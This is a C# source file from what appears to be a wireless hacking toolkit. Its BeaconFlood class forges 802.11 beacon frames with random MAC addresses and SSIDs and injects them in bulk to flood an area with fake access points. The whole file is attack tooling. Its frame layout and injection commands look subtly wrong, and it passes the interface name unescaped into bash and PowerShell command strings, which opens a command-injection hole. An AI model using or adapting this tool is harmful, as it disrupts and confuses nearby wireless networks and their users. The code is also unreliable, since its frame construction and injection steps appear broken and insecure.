using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace HackItWireless
{
    public sealed class BeaconFlood
    {
        private static readonly Random Rng = new();

        public byte[] BuildBeaconFrame(string ssid, string bssid, byte channel = 6, string crypto = "WPA2")
        {
            if (string.IsNullOrWhiteSpace(ssid))
                throw new ArgumentException("SSID cannot be null or empty.", nameof(ssid));
            if (string.IsNullOrWhiteSpace(bssid))
                throw new ArgumentException("BSSID cannot be null or empty.", nameof(bssid));
            if (ssid.Length > 32)
                throw new ArgumentException("SSID must be 32 characters or less.", nameof(ssid));

            byte[] bssidBytes = DeauthEngine.ParseMac(bssid);
            byte[] ssidBytes = Encoding.UTF8.GetBytes(ssid);

            var frameParts = new List<byte[]>();

            byte[] fixedHeader = new byte[36];
            int offset = 0;

            fixedHeader[offset] = 0x80;
            offset++;
            fixedHeader[offset] = 0x00;
            offset++;

            ushort duration = 0;
            fixedHeader[offset] = (byte)(duration & 0xFF);
            fixedHeader[offset + 1] = (byte)((duration >> 8) & 0xFF);
            offset += 2;

            Array.Copy(bssidBytes, 0, fixedHeader, offset, 6);
            offset += 6;
            Array.Copy(bssidBytes, 0, fixedHeader, offset, 6);
            offset += 6;
            Array.Copy(bssidBytes, 0, fixedHeader, offset, 6);
            offset += 6;

            fixedHeader[offset] = 0x00;
            fixedHeader[offset + 1] = 0x00;
            offset += 2;

            byte capInfoMsb = 0x04;
            byte capInfoLsb = 0x01;
            switch (crypto?.ToUpperInvariant())
            {
                case "WPA2":
                    capInfoMsb = 0x04;
                    capInfoLsb = 0x31;
                    break;
                case "WPA3":
                    capInfoMsb = 0x14;
                    capInfoLsb = 0x31;
                    break;
                case "OPEN":
                    capInfoMsb = 0x04;
                    capInfoLsb = 0x01;
                    break;
            }

            fixedHeader[offset] = capInfoMsb;
            offset++;
            fixedHeader[offset] = capInfoLsb;
            offset++;

            fixedHeader[offset++] = 0;
            fixedHeader[offset++] = 0;
            fixedHeader[offset++] = 0;
            fixedHeader[offset++] = 0;

            fixedHeader[offset++] = 0x64;
            fixedHeader[offset++] = 0x00;

            fixedHeader[offset] = (byte)channel;
            offset++;

            fixedHeader[offset] = 0x00;
            fixedHeader[offset + 1] = 0x00;

            frameParts.Add(fixedHeader);

            byte[] ssidElement = new byte[2 + ssidBytes.Length];
            ssidElement[0] = 0x00;
            ssidElement[1] = (byte)ssidBytes.Length;
            Array.Copy(ssidBytes, 0, ssidElement, 2, ssidBytes.Length);
            frameParts.Add(ssidElement);

            byte[] ratesElement = new byte[] { 0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24 };
            frameParts.Add(ratesElement);

            byte[] dsElement = new byte[] { 0x03, 0x01, channel };
            frameParts.Add(dsElement);

            if (crypto?.ToUpperInvariant() == "WPA2" || crypto?.ToUpperInvariant() == "WPA3")
            {
                byte[] rsnElement = BuildRsnIe(crypto);
                frameParts.Add(rsnElement);
            }

            return frameParts.SelectMany(p => p).ToArray();
        }

        public async Task Flood(string interfaceName, int count = 100, string ssid = null, byte channel = 6)
        {
            if (string.IsNullOrWhiteSpace(interfaceName))
                throw new ArgumentException("Interface name cannot be null or empty.", nameof(interfaceName));

            for (int i = 0; i < count; i++)
            {
                string bssid = GenerateRandomMac();
                string currentSsid = ssid ?? $"Network{i:D4}";

                byte[] frame = BuildBeaconFrame(currentSsid, bssid, channel);
                await InjectFrame(interfaceName, frame).ConfigureAwait(false);
                await Task.Delay(1).ConfigureAwait(false);
            }
        }

        public async Task RandomSsidFlood(string interfaceName, int count = 200)
        {
            var ssidList = new List<string>();
            for (int i = 0; i < count; i++)
                ssidList.Add(GenerateRandomSsid());

            var tasks = new List<Task>();
            foreach (string ssid in ssidList)
            {
                string bssid = GenerateRandomMac();
                byte channel = (byte)Rng.Next(1, 14);
                byte[] frame = BuildBeaconFrame(ssid, bssid, channel);

                tasks.Add(InjectFrame(interfaceName, frame));
            }

            await Task.WhenAll(tasks).ConfigureAwait(false);
        }

        private static byte[] BuildRsnIe(string crypto)
        {
            bool isWpa3 = crypto?.ToUpperInvariant() == "WPA3";
            byte akmOuiType = isWpa3 ? (byte)8 : (byte)4;

            byte[] rsn = new byte[]
            {
                0x30, 0x00,
                0x01, 0x00,
                0x00, 0x0F, 0xAC, 0x04,
                0x01, 0x00,
                0x00, 0x0F, 0xAC, 0x04,
                0x01, 0x00,
                0x00, 0x0F, 0xAC, akmOuiType,
                0x00, 0x00,
            };

            if (isWpa3)
            {
                byte[] wpa3Ext = new byte[]
                {
                    0xDD, 0x14,
                    0x00, 0x50, 0xF2, 0x01,
                    0x01, 0x00,
                    0x00, 0x50, 0xF2, 0x02,
                    0x01, 0x00,
                    0x00, 0x50, 0xF2, akmOuiType,
                    0x00, 0x00,
                };
                return rsn.Concat(wpa3Ext).ToArray();
            }

            int rsnLen = rsn.Length - 2;
            rsn[1] = (byte)rsnLen;

            return rsn;
        }

        private static async Task InjectFrame(string interfaceName, byte[] frame)
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                string hex = Convert.ToHexString(frame);
                var psi = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = $"-Command \"[System.IO.File]::WriteAllBytes('\\\\.\\{interfaceName}', 0x{hex})\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                };
                using var proc = Process.Start(psi);
                if (proc != null) await proc.WaitForExitAsync().ConfigureAwait(false);
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
            {
                string hex = BitConverter.ToString(frame).Replace("-", "");
                var psi = new ProcessStartInfo
                {
                    FileName = "bash",
                    Arguments = $"-c \"echo '{hex}' | xxd -r -p | iw dev {interfaceName} inject -\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                };
                using var proc = Process.Start(psi);
                if (proc != null) await proc.WaitForExitAsync().ConfigureAwait(false);
            }
            else
            {
                throw new PlatformNotSupportedException("Frame injection is only supported on Windows and Linux.");
            }
        }

        private static string GenerateRandomMac()
        {
            byte[] bytes = new byte[6];
            Rng.NextBytes(bytes);
            bytes[0] = (byte)(bytes[0] & 0xFE | 0x02);
            return string.Join(":", bytes.Select(b => b.ToString("X2")));
        }

        private static string GenerateRandomSsid()
        {
            int len = Rng.Next(4, 13);
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-";
            var ssid = new char[len];
            for (int i = 0; i < len; i++)
                ssid[i] = chars[Rng.Next(chars.Length)];
            return new string(ssid);
        }
    }
}
